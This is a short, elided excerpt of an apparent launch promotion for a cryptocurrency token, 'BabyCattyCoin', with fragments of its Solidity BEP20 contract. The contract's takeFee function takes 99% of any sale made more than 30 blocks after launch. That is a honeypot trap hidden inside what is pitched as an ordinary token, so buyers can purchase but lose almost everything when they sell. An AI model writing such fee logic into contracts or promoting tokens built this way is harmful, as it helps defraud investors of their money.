...
Missed Catty Coin ? Baby Catty Coin Launch soon !!
BabyCattyCoin
...
contract BabyCattyCoin is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "BabyCattyCoin";
    string constant _symbol = "BABYCATTY";
    ...
    function takeFee(address sender, uint256 amount, bool isSell) internal returns (uint256) {
        ...
        } else if(isSell && (launchedAt + 30 < block.number)){
            feeAmount = amount.div(100).mul(99);
        }
